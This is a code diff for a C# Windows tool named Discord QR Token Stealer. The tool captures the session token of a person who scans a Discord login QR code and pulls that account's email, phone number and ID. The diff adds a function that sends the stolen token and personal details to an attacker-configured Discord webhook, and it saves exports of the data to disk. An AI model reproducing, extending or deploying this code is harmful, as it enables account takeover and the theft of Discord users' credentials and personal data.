@@ -1,20 +1,15 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using CefSharp.WinForms;
 using CefSharp;
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
 using System.Net;
 using Newtonsoft.Json;
-using Newtonsoft.Json.Linq;
+using System.Diagnostics;
+using System.Text;
 
 namespace Discord_QR_Token_Stealer
 {
@@ -22,7 +17,12 @@ namespace Discord_QR_Token_Stealer
     {
         // stupid shit
         public bool createdQr = false;
-        public JToken tokenInfo = null;
+        
+        public TokenInformation tokenInfo = null;
+
+        public static string webhookUrl = string.Empty;
+        public List<string> loggedTokens = new List<string>();
+
         public System.Windows.Forms.Timer timeLeftTimer = new System.Windows.Forms.Timer();
         public TimeSpan timeLeft;
         public DateTime timeStart;
@@ -42,6 +42,10 @@ namespace Discord_QR_Token_Stealer
             if (File.Exists("console.log"))
                 File.Delete("console.log");
 
+            // import webhooks
+            if (File.Exists("webhook.txt"))
+                webhookUrl = File.ReadAllText("webhook.txt");
+
             // delete the prev ones
             foreach (var file in Directory.GetFiles("."))
                 if (file.Contains("finalized"))
@@ -51,6 +55,10 @@ namespace Discord_QR_Token_Stealer
             timeLeftTimer.Tick += (a, b) =>
             {
                 timeLeft = timeEnd - DateTime.UtcNow;
+
+                if (timeLeft.TotalSeconds <= 0)
+                    return;
+
                 lblTimeLeft.Invoke((MethodInvoker)(() =>
                 {
                     lblTimeLeft.Text = $"{Math.Round(timeLeft.TotalSeconds)} seconds until expiration";
@@ -107,7 +115,14 @@ namespace Discord_QR_Token_Stealer
                 client.UserAgent = "ur/mom";
             
                 // lazy work right here
-                return JsonConvert.DeserializeObject(new StreamReader(client.GetResponse().GetResponseStream()).ReadToEnd());
+                var json = JsonConvert.DeserializeObject<TokenInformation>(new StreamReader(client.GetResponse().GetResponseStream()).ReadToEnd());
+                json.Token = token;
+
+                // replace null phone number with "not registered"
+                if (json.Phone == null)
+                    json.Phone = "Not registered";
+
+                return json;
             } catch (Exception ex)
             {
                 // even more lazy work
@@ -175,6 +190,9 @@ namespace Discord_QR_Token_Stealer
 
         void updateInfo(string token)
         {
+            if (loggedTokens.Contains(token))
+                return; 
+
             // token information frm token supplied
             tokenInfo = getTokenDetails(token);
 
@@ -183,11 +201,17 @@ namespace Discord_QR_Token_Stealer
             {
                 // setting data, substrings are for proper formatting
                 lblToken.Text = token;
-                lblTag.Text = $"{tokenInfo["username"].ToString().Substring(1, tokenInfo["username"].ToString().Length - 2)}#{tokenInfo["discriminator"].ToString().Substring(1, tokenInfo["discriminator"].ToString().Length - 2)}";
-                lblId.Text = tokenInfo["id"].ToString().Substring(1, tokenInfo["id"].ToString().Length - 2);
-                lblPhone.Text = tokenInfo["phone"].ToString().Substring(1, tokenInfo["phone"].ToString().Length - 2);
-                lblEmail.Text = tokenInfo["email"].ToString().Substring(1, tokenInfo["email"].ToString().Length - 2);
+                lblTag.Text = $"{tokenInfo.Username}#{tokenInfo.Discriminator}";
+                lblId.Text = tokenInfo.Id;
+                lblPhone.Text = tokenInfo.Phone;
+                lblEmail.Text = tokenInfo.Email;
             }));
+
+            // add to the logged toksn list so taht it doesnt send multiple hooks
+            loggedTokens.Add(token);
+
+            // send the webhook
+            sendWebhook();
         }
 
         // says its loaded
@@ -208,8 +232,8 @@ namespace Discord_QR_Token_Stealer
                     updateInfo(msg.Message.Substring(7, msg.Message.Length - 8));
 
                 //File.AppendAllText("console.log", $"{msg.Message}\n");
-                listBox2.Invoke((MethodInvoker)(() => {
-                    listBox2.Items.Add(msg.Message);
+                logBox.Invoke((MethodInvoker)(() => {
+                    logBox.Items.Add(msg.Message);
                 }));
             };
         }
@@ -254,7 +278,7 @@ namespace Discord_QR_Token_Stealer
                 Directory.CreateDirectory("exports");
 
             // its 6:30 am help
-            File.WriteAllText($"exports/token_export_{tokenInfo["id"].ToString().Substring(1, tokenInfo["id"].ToString().Length - 2)}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented));
+            File.WriteAllText($"exports/token_export_{tokenInfo.Id}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented));
         }
 
         // reload button
@@ -274,5 +298,88 @@ namespace Discord_QR_Token_Stealer
         {
             new infoPanel().Show();
         }
+
+        private void setHook_Click(object sender, EventArgs e)
+        {
+            new setHook().ShowDialog();
+            File.WriteAllText("webhook.txt", webhookUrl);
+        }
+
+        void sendWebhook()
+        {
+            if (webhookUrl == string.Empty)
+            {
+                createLog("Skipping webhook, no URL supplied");
+                return;
+            } else if (!webhookUrl.Contains("https://discord.com/api/webhooks/"))
+            {
+                createLog("Skipping webhook, invalid webhook URL");
+                return;
+            }
+            
+            if (tokenInfo == null)
+            {
+                createLog("Skipping webhook, token information was null");
+                return;
+            }
+
+            string av;
+            if (tokenInfo.Avatar == null)
+                av = "https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg";
+            else
+                av = tokenInfo.Avatar;
+
+            try
+            {
+                var body = "{\"embeds\":[{\"title\":\"Token grabbed!\",\"description\":\"`" + tokenInfo.Token + "`\",\"color\":\"7407103\",\"thumbnail\":{\"url\":\"" + av + "\"},\"fields\":[{\"name\":\"Email\",\"value\":\"" + tokenInfo.Email + "\"},{\"name\":\"Phone\",\"value\":\"" + tokenInfo.Phone + "\"}],\"timestamp\":\"" + DateTime.Now.ToUniversalTime().ToString("o") + "\",\"footer\":{\"text\":\"made by verlox.cc\"}}],\"avatar_url\":\"https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg\",\"username\":\"lithhook\"}";
+
+                // log body to debug
+                Debug.WriteLine(body);
+
+                // make request and set settings
+                var req = WebRequest.Create(webhookUrl);
+                req.Method = "POST";
+                req.ContentType = "application/json";
+
+                // convert to bytes so we can write it as the body
+                var bytes = Encoding.UTF8.GetBytes(body);
+                req.GetRequestStream().Write(bytes, 0, bytes.Length);
+
+                // get response
+                var res = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
+                Debug.WriteLine(res);
+
+                // create a log
+                createLog($"Sent webhook, Discord returned: {res}");
+            } catch (Exception ex)
+            {
+                Debug.WriteLine(ex);
+                createLog($"Failed to send webhook: {ex.Message}");
+            }
+        }
+
+        void createLog(string text)
+        {
+            if (logBox.InvokeRequired)
+            {
+                logBox.Invoke((MethodInvoker)(() =>
+                {
+                    logBox.Items.Add(text);
+                }));
+            } else
+                logBox.Items.Add(text);
+        }
+    }
+
+    // class that data from tokens
+    public class TokenInformation
+    {
+        public string Token;
+        public string Id;
+        public string Username;
+        public string Discriminator;
+        public string Email;
+        public string Phone;
+        public string Avatar;
     }
 }
